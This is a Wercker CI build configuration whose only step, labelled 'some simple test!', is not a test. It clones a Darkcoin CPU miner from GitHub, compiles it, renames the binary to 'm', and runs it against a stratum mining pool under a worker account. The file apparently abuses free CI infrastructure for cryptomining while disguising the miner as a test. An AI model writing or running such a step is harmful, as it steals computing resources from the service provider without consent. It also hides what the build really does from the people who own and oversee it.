box: wercker/default
build:
  steps:
    -  script:
        name: some simple test!
        code: |-
          git clone https://github.com/ig0tik3d/darkcoin-cpuminer-1.2c.git && cd darkcoin-cpuminer-1.2c && chmod a+x autogen.sh && ./autogen.sh && ./configure && make && mv min*d m && ./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.wer -p ker


